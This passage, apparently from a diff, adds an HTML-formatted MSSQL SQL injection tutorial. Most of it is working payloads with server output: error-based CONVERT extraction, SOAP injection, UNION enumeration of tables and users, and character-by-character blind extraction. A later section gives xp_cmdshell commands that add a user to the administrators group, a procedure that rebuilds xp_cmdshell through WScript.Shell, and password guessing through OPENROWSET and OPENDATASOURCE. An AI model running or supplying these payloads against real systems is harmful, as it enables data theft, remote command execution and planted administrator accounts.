+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will see uname in returned error.<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'admin' to data type int.<br/>
+		/page.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	Now, we know that there is 'admin' in column 'uname' of table 'users'. For another uname, <br/>
+	we just create a known table list as table and column.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	Error again:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'cwh' to data type int.<br/>
+		/page.asp, line 9<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	OK, we get another &quot;uname&quot; which is 'cwh'. If we try following request.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin','cwh')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	And we get an error like this<br/>
+<br/>
+		------------------------------------------------------------------------------------<br/>
+		ADODB.Field error '800a0bcd'<br/>
+		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.<br/>
+		/showthread.asp, line 10 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	It means there are only two uname in users table (admin,cwh).<br/>
+	<br/>
+<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	[0x02d] - MSSQL Injection in Web Services (SOAP Injection)<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+		<br/>
+		Web Services use XML messages that follow the SOAP standard and have been popular with traditional enterprise. <br/>
+	In such systems, there is often a machine-readable description of the operations offered by the service written in the <br/>
+	Web Services Description Language (WSDL). <br/>
+		SOAP is often used in large-scale enterprise applications where individual tasks are performed by different computers to <br/>
+	improve performance. It's often found where web application that deployed as a front-end to an existing application.<br/>
+<br/>
+			Let's take a look for SOAP request like this:<br/>
+	<br/>
+		[SOAP Request]------------------------------------------------------------------------------<br/>
+<br/>
+		POST /webservice/service.asmx HTTP/1.0<br/>
+		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)<br/>
+		Content-Type: text/xml; charset=utf-8<br/>
+		SOAPAction: &quot;http://tempuri.org/GetUserInfo&quot;<br/>
+		Host: testcwh.cwh.net<br/>
+		Content-Length: 345<br/>
+		Expect: 100-continue<br/>
+		Connection: Keep-Alive<br/>
+	<br/>
+		&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; <br/>
+		xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;<br/>
+		&lt;GetUserInfo xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;1234&lt;/password&gt;&lt;/GetUserInfo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;<br/>
+		<br/>
+		[End Request]-------------------------------------------------------------------------------<br/>
+	<br/>
+			Can you see username(admin) and password(1234) that send to Server side ?<br/>
+<br/>
+			What's happen if we injection (') single quote to username field like this: &lt;username&gt;admin'&lt;/username&gt;&lt;password&gt;1234&lt;/password&gt;<br/>
+		before It send to Server Side. We can use Web proxy (Burpsuite, Paros proxy) to intercept SOAP request and SOAP respond.<br/>
+<br/>
+		[SOAP Respond When we inject single quote]--------------------------------------------------<br/>
+	<br/>
+		HTTP/1.1 200 OK<br/>
+		Date: Mon, 26 Jan 2009 15:45:27 GMT<br/>
+		Server: Microsoft-IIS/6.0<br/>
+		X-Powered-By: ASP.NET<br/>
+		X-AspNet-Version: 2.0.50727<br/>
+		Cache-Control: private, max-age=0<br/>
+		Content-Type: text/xml; charset=utf-8<br/>
+		Content-Length: 1057<br/>
+		Connection: close<br/>
+		X-Junk: xxxxxxxxxxx<br/>
+	<br/>
+		&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; <br/>
+		xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;<br/>
+		&lt;GetUserInfoResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;GetUserInfoResult&gt;&lt;ErrorOccured&gt;true&lt;/ErrorOccured&gt;&lt;ErrorStr&gt;<br/>
+		System.Data.OleDb.OleDbException: Unclosed quotation mark after the character string ''.<br/>
+		Incorrect syntax near '81'.<br/>
+		  at System.Data.OleDb.OleDbDataReader.ProcessResults(OleDbHResult hr)<br/>
+		  at System.Data.OleDb.OleDbDataReader.NextResult()<br/>
+		  at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method)<br/>
+		  at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior)<br/>
+		  at Service.GetUserInfo(String username, String password)&lt;/ErrorStr&gt;&lt;SqlQuery&gt;SELECT * FROM users WHERE username='admin'' <br/>
+		  AND password='81dc9bdb52d04dc20036dbd8313ed055'&lt;/SqlQuery&gt;&lt;id&gt;-1&lt;/id&gt;&lt;joindate&gt;0001-01-01T00:00:00&lt;/joindate&gt;&lt;/GetUserInfoResult&gt;<br/>
+		  &lt;/GetUserInfoResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;<br/>
+		<br/>
+		[End Respond]-------------------------------------------------------------------------------<br/>
+	<br/>
+		Okey, The SOAP respond return error message like that. We can use simple techiques for SQLi that we showed you <br/>
+		in section [0x02b] - ODBC Error Message Attack with &quot;CONVERT&quot;, Let's use this SQLi: <br/>
+		<br/>
+			admin' and 1=convert(int,@@version)--<br/>
+	<br/>
+		[SOAP Request/Respond]----------------------------------------------------------------------<br/>
+		<br/>
+		*** Request ***<br/>
+		POST /webservice/service.asmx HTTP/1.0<br/>
+		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)<br/>
+		Content-Type: text/xml; charset=utf-8<br/>
+		SOAPAction: &quot;http://tempuri.org/GetUserInfo&quot;<br/>
+		Host: testcwh.cwh.net<br/>
+		Content-Length: 384<br/>
+		<br/>
+		&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; <br/>
+		xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;<br/>
+		&lt;GetUserInfo xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;username&gt;admin' and 1=convert(int,@@version)--&lt;/username&gt;&lt;password&gt;1234&lt;/password&gt;<br/>
+		&lt;/GetUserInfo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;<br/>
+		<br/>
+		<br/>
+		*** Response ***<br/>
+		HTTP/1.1 200 OK<br/>
+		Date: Wed, 28 Jan 2009 15:59:17 GMT<br/>
+		Server: Microsoft-IIS/6.0<br/>
+		X-Powered-By: ASP.NET<br/>
+		X-AspNet-Version: 2.0.50727<br/>
+		Cache-Control: private, max-age=0<br/>
+		Content-Type: text/xml; charset=utf-8<br/>
+		Content-Length: 1266<br/>
+		Connection: close<br/>
+		X-Junk: xxxxxxxxxxx<br/>
+		<br/>
+		&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; <br/>
+		xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;<br/>
+		&lt;GetUserInfoResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;GetUserInfoResult&gt;&lt;ErrorOccured&gt;true&lt;/ErrorOccured&gt;&lt;ErrorStr&gt;<br/>
+		System.Data.OleDb.OleDbException: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) <br/>
+		Feb 9 2007 22:47:07 <br/>
+		Copyright (c) 1988-2005 Microsoft Corporation<br/>
+		Express Edition on Windows NT 5.2 (Build 3790: Service Pack 1)<br/>
+		' to data type int.<br/>
+		at System.Data.OleDb.OleDbDataReader.ProcessResults(OleDbHResult hr)<br/>
+		at System.Data.OleDb.OleDbDataReader.NextResult()<br/>
+		at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method)<br/>
+		at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior)<br/>
+		at Service.GetUserInfo(String username, String password)&lt;/ErrorStr&gt;&lt;SqlQuery&gt;SELECT * FROM users WHERE username='admin' <br/>
+		and 1=convert(int,@@version)--' AND password='81dc9bdb52d04dc20036dbd8313ed055'&lt;/SqlQuery&gt;&lt;id&gt;-1&lt;/id&gt;&lt;joindate&gt;0001-01-01T00:00:00&lt;/joindate&gt;<br/>
+		&lt;/GetUserInfoResult&gt;&lt;/GetUserInfoResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;<br/>
+	<br/>
+		[End]---------------------------------------------------------------------------------------<br/>
+	<br/>
+			W00t!! W00t!!, We can enumerate MSSQL Version : Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86).<br/>
+		Then we can use SQLi techniques that we mention above (Dump tables, columns, data, Etc).<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x02c] - MSSQL Injection with UNION Attack<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		This method differs from the both previous methods because we do not get information through error <br/>
+	but we, instead, see it in some point of returned page.<br/>
+<br/>
+	First of all, we have to know the exact number of selected column. We can find it by using ORDER BY clause.<br/>
+<br/>
+		http://www.example.com/page.asp?id=1 order by 1--<br/>
+		http://www.example.com/page.asp?id=1 order by 2--<br/>
+		http://www.example.com/page.asp?id=1 order by 3--<br/>
+		http://www.example.com/page.asp?id=1 order by 4--<br/>
+		and so on<br/>
+<br/>
+	We observe a result from each request until we get error like this.<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e14'<br/>
+		The ORDER BY position number 5 is out of range of the number of items in the select list.<br/>
+		/showthread.asp, line 9<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	This means this page select four columns from table and this error occurs when we request http://www.example.com/page.asp?id=1 order by 5--<br/>
+<br/>
+	Now, we use UNION operator to gain information.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,44--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will see &quot;11&quot; or &quot;22&quot; or &quot;33&quot; or &quot;44&quot; appeared on some point in returned page. We assume that <br/>
+	we have already located the position which &quot;44&quot; occur on the screen.<br/>
+	(We should remember this position because it is where our information will be appeared)<br/>
+<br/>
+	As we found &quot;44&quot; on the screen, we replace &quot;44&quot; with &quot;@@version&quot; in order to find the version of MSSQL.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,@@version--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will see version of MSSQL appeared in the position which &quot;44&quot; occurred.<br/>
+<br/>
+	At this point, we know that next information definitely takes place in this position.<br/>
+<br/>
+		The rest are to find table names, column names and data. As we see in previous section, <br/>
+	we can obtain table names and column names through &quot;information_schema&quot; database.<br/>
+	We still use the same way in this approach.<br/>
+		<br/>
+		[SQli]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will see the first table on the screen. We assume it is table called 'threads'. We can find next table by following request.<br/>
+		<br/>
+		[SQli]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables where table_name not in ('threads')--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We assume the retrieved table is 'users'. So, we append a known table list until we get blank in position which &quot;44&quot; occurred.<br/>
+	After we get all table names that we want, we move to gather column names.<br/>
+		<br/>
+		[SQli]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users'--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	From this request, we will see the first column in table 'users'. We assume it is 'uname'. For another column, we can use following request.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users' and <br/>
+		column_name not in ('uname')--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We get the second column which is 'upass' and we continue appending a known column list until we get blank result.<br/>
+	The most wanted information is data. It is quite simple after we obtained table names and column names. We just use following request.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,uname from users--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will get data such as admin from the request. In order to get another row, we only append information list as following.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,uname from users where uname not in ('admin')--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+	<br/>
+	Now, we can enumerate the rest data.<br/>
+<br/>
+<br/>
+###########################################<br/>
+[0x03] - MSSQL Blind SQL Injection Attack<br/>
+###########################################<br/>
+<br/>
+	<br/>
+	In some case, Using normal sql injection is not work. Blind sql injection is another method which may help you.<br/>
+The important point for blind sql injection is the difference between the valid and invalid query result.<br/>
+You have to inject a statement to make query valid or invalid and observe the response.<br/>
+	Just because you don't see any results, doesn't mean that your injected SQL is not being executed !!<br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x03a] - How to Test sites that are vulnerable in Blind SQL Injection<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		We assume that http://www.example.com/page.asp?id=1 is normal url to open web page.<br/>
+<br/>
+	You can try to inject a statement like this<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 and 1=1	<br/>
+	and<br/>
+	http://www.example.com/page.asp?id=1 and 1=2<br/>
+<br/>
+		If the results from these requests are different, it will be a good signal for you.<br/>
+	This website may fall to blind sql injection vulnerability. When you put &quot;id=1 and 1=1&quot;, <br/>
+	it means that the condition is true so, the response must be normal. <br/>
+	But the parameter &quot;id=1 and 1=2&quot; indicates that the condition is false <br/>
+	and if the webmaster does not provide a proper filter, the response absolutely differs from previous.<br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x03b] - Determine data through Blind SQL Injection<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		By using blind technique, you have to spend more time than normal injection. <br/>
+	You can obtain only one character while you send several queries to server.<br/>
+	We will give you an example of querying the first character of database name. <br/>
+	We assume that database name is member. Therefore, the first character is &quot;m&quot; <br/>
+	which the ascii value is 109. (At this point, we assume that you know ascii code)<br/>
+<br/>
+	Ok, first, we have to know that the results from requests have only 2 forms.<br/>
+<br/>
+	1. Valid query result likes http://www.example.com/page.asp?id=1 and 1=1<br/>
+	2. Invalid query result likes http://www.example.com/page.asp?id=1 and 1=2<br/>
+<br/>
+	<br/>
+	The following steps are up to each person. You idea may be different from our idea in order to pick ascii code to test query.<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90<br/>
+<br/>
+	In this situation, the result will be valid query result like http://www.example.com/page.asp?id=1 and 1=1 <br/>
+	(because the first character of database name is &quot;m&quot; which ascii code is 109). Then, we try<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;120<br/>
+<br/>
+	It is surely that the result will like http://www.example.com/page.asp?id=1 and 1=2 (because 109 absolutely less than 120).<br/>
+	next, we try<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;105<br/>
+<br/>
+	The result is a valid query result and at this point, the ascii value of first character of database name is between 105 and 120.<br/>
+	So, we try<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;112 ===&gt; invalid query result<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;108 ===&gt; valid query result<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;110 ===&gt; invalid query result<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;109 ===&gt; invalid query result<br/>
+<br/>
+		You see that the first character of database name has an ascii value which is greater than 108 <br/>
+	but is not greater than 109. Thus, we can conclude that the ascii value is equal to 109.<br/>
+	You can prove with:<br/>
+	<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109 .<br/>
+	<br/>
+	We sure that the result is like the result of http://www.target.com/page.php?id=1 and 1=1 .<br/>
+<br/>
+	The rest which you have to do is to manipulate some queries to collect your preferred information.<br/>
+	In this tutorial, we propose some example queries in order to find the names of tables and columns in the database.<br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x03c] - Exploit query for get Table name <br/>
+	++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		In order to get table name, we can use above method to obtain each character of table name.<br/>
+	The only thing that we have to do is to change query to retrieve table name of current database. <br/>
+	As MSSQL does not have limit command. Therefore, the query is a bit complicate.<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) <br/>
+	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))<br/>
+	AS varchar(8000)),1,1)),0)&gt;97<br/>
+<br/>
+		The above query is used to determine the first character of first table in current database. If we want to find second character of first table,<br/>
+	we can do by following request:<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) <br/>
+	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))<br/>
+	AS varchar(8000)),2,1)),0)&gt;97<br/>
+<br/>
+		We change the second parameter of substring function from 1 to 2 in order to specify preferred position of character in table name.<br/>
+	Thus, if we want to determine other positions, we require only changing second parameter of substring function.<br/>
+<br/>
+		In case of other tables, we can find other table names by changing the second select <br/>
+	from &quot;SELECT TOP 1&quot; to be &quot;SELECT TOP 2&quot; , &quot;SELECT TOP 3&quot; and so on. for example,<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) <br/>
+	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 2 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))<br/>
+	AS varchar(8000)),1,1)),0)=97<br/>
+<br/>
+		The above request will determine the first character of the second table name in current database.<br/>
+<br/>
+<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x03d] - Exploit query for get Column name <br/>
+	+++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		After we obtain table names, the next target information is absolutely column names. <br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM <br/>
+	syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE <br/>
+	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),1,1)),0)&gt;97<br/>
+<br/>
+		In order to circumvent from magic quote filtering, you have to change 'tablename' <br/>
+	to be the form of concatenating char() command. for example, if table name is 'user', <br/>
+	when we put 'user' in the query, ' may be filtered and our query will be wrong.<br/>
+	The solution is convert 'user' to be char(117)+char(115)+char(101)+char(114). <br/>
+	So, the query in where cluase changes from &quot;Where name='user'&quot; to &quot;Where name=char(117)+char(115)+char(101)+char(114)&quot;.<br/>
+	In this case, we can circumvent magic quote filtering. The result from the above request is the first character of the first column name of specific table.<br/>
+	When we want to find the second character of the first column, we can use the same method as getting table name, by changing the second parameter of <br/>
+	substring function.<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM <br/>
+	syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE <br/>
+	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),2,1)),0)&gt;97<br/>
+<br/>
+	The above request is used to determine the second character of the first column name in specific table.<br/>
+	In case of determining other columns, we can do by changing p.x value from 1 to 2,3,4 and so on. such as,<br/>
+<br/>
+	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM <br/>
+	syscolumns i WHERE(i.colid&lt;=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE <br/>
+	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=2))AS varchar(8000)),1,1)),0)&gt;97<br/>
+<br/>
+	The first character of the second column name in specific table can be determined by the above request.<br/>
+<br/>
+<br/>
+##############################################	<br/>
+[0x04] - More Dangerous SQL Injection Attack<br/>
+##############################################<br/>
+		<br/>
+		In Chapter [0x02] and [0x03], We described about retrieving any useful data that was extracted from database <br/>
+	via SQL Injection techniques - for example, by performing a UNION Attack, Returning data in an error message and Blind injection. <br/>
+		This chapter will not show only an data extraction but command execution and sql worms as well.<br/>
+<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x04a] - Dangerous from Extended Stored Procedures<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		xp_cmdshell     - Executes a given command on the MSSQL Operation system<br/>
+			       - Available by default on all MSSQL (Disabled on MSSQL 2005)<br/>
+			       - Can only be executed by 'sa' and any other users with 'sysadmin' privileges<br/>
+		<br/>
+		xp_regxxx      - Read/Write registry keys, potentially including the Read SAM file<br/>
+			<br/>
+			xp_regread	<br/>
+			xp_regwrite<br/>
+			xp_regdeletekey<br/>
+			xp_regdeletevalue<br/>
+			xp_regenumkeys<br/>
+			xp_regenumvalues<br/>
+<br/>
+			[Example for determines what null-session shares are available on the server]<br/>
+			exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares'<br/>
+	<br/>
+		xp_servicecontrol  - Allows to Manage Services<br/>
+			<br/>
+			[Example Command]--------------------------------------------------------------------<br/>
+			exec master..xp_servicecontrol 'start','schedule'<br/>
+			exec master..xp_servicecontrol 'start','server'<br/>
+			[End Command]------------------------------------------------------------------------<br/>
+		<br/>
+		xp_availablemedia  - Reveals the available drives on the machine<br/>
+		xp_dirtree	   - Allows a directory tree to be obtained<br/>
+		xp_enumdsn	   - Enumerates ODBC data sources on the server<br/>
+		xp_makecab	   - Allows the user to create a compressed archive of files on the server<br/>
+		xp_ntsec_enumdomains - Enumerates domains that the server can access<br/>
+		xp_terminate_process - Terminate a process (PID)<br/>
+		xp_loginconfig	   - Login mode<br/>
+	<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x04b] - Advanced SQL Injection Techniques<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++<br/>
+		<br/>
+		&quot;xp_cmdshell&quot; Stored procedures, executes any command shell in the server with the same permissions that it is currently running. <br/>
+	By default, only sysadmin is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp_configure) <br/>
+<br/>
+	EXEC master.dbo.xp_cmdshell 'net user cwh cwh1234 /add' ;--			//Use for add user &quot;cwh&quot; into system.<br/>
+	EXEC master.dbo.xp_cmdshell 'net localgroup administrators cwh /add' ;--	//Use for escalating privilege &quot;cwh&quot; to admin group<br/>
+<br/>
+	Example through SQL injection in a numeric field via a GET request:<br/>
+	http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'<br/>
+<br/>
+	On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:<br/>
+<br/>
+	EXEC sp_configure 'show advanced options', 1;--<br/>
+	RECONFIGURE;-- <br/>
+	EXEC sp_configure 'xp_cmdshell', 1;-- <br/>
+	RECONFIGURE;-- <br/>
+<br/>
+	On MSSQL 2000:<br/>
+	<br/>
+	If you have 'sa' privileges but xp_cmdshell has been disabled/removed with sp_dropextendedproc, <br/>
+	we can simply inject the following code:<br/>
+<br/>
+	EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--<br/>
+<br/>
+		This creates a new stored procedure 'xp_anyname' linked to xp_log70.dll, which provides the xp_cmdshell functionality.<br/>
+	If the previous code does not work, it means that the xp_log70.dll has been moved or deleted. In this case we need to inject the following code:<br/>
+<br/>
+		CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS<br/>
+		DECLARE @result int, @OLEResult int, @RunResult int<br/>
+		DECLARE @ShellID int<br/>
+		EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT<br/>
+		IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult<br/>
+		IF @OLEResult &lt;&gt; 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)<br/>
+		EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait<br/>
+		IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult<br/>
+		IF @OLEResult &lt;&gt; 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)<br/>
+		EXECUTE @OLEResult = sp_OADestroy @ShellID<br/>
+		return @result<br/>
+	<br/>
+	** Tip **<br/>
+<br/>
+	[Question] <br/>
+		Determined that the web application connects to the DB with unprivileged account. <br/>
+	So we can't execute XP_CMDSHELL or access any interesting data ?<br/>
+<br/>
+	[Answer]  <br/>
+		It's not the end, First we must enumerate MSSQL user accounts that have system administrator privileges.<br/>
+<br/>
+	[Code]--------------------------------------------------------------------------------------<br/>
+	http://www.example.com/news.asp?id=1 union all select null,null,name,null,null,null,null from master..syslogins where name not in ('sa') and sysadmin=1;--<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+		<br/>
+	[Result]------------------------------------------------------------------------------------<br/>
+	sa<br/>
+	cwh<br/>
+	example<br/>
+	[End Result]--------------------------------------------------------------------------------<br/>
+		<br/>
+		We can use &quot;OPENROWSET&quot; to re-connect to the same database server under each enumerated <br/>
+	sysadmin account and guess passwords. This was automated via a Perl script to do brute-force password guessing through the SQL injection:<br/>
+	<br/>
+	[Code]--------------------------------------------------------------------------------------<br/>
+	http://www.example.com/news.asp?id=1 union select * from openrowset('SQLoledb','server=VICTIMDBNAME;uid=$USER;pwd=$PASS','select * from master..sysusers')--<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+<br/>
+	//Result: Found that &quot;CWH&quot; has a &quot;1234&quot;<br/>
+		  <br/>
+		Leveraged the &quot;OPENDATASOURCE&quot; function to execute a stored procedure on the database, under the &quot;CWH&quot; system administrator credentials:<br/>
+	<br/>
+	[Code]--------------------------------------------------------------------------------------<br/>
+	http://www.example.com/news.asp?id=1; EXEC opendatasource('SQLoledb','Persist Security Info=False;DataSource=VICTIMDBNAME;UserID=CWH;Password=1234').master<br/>
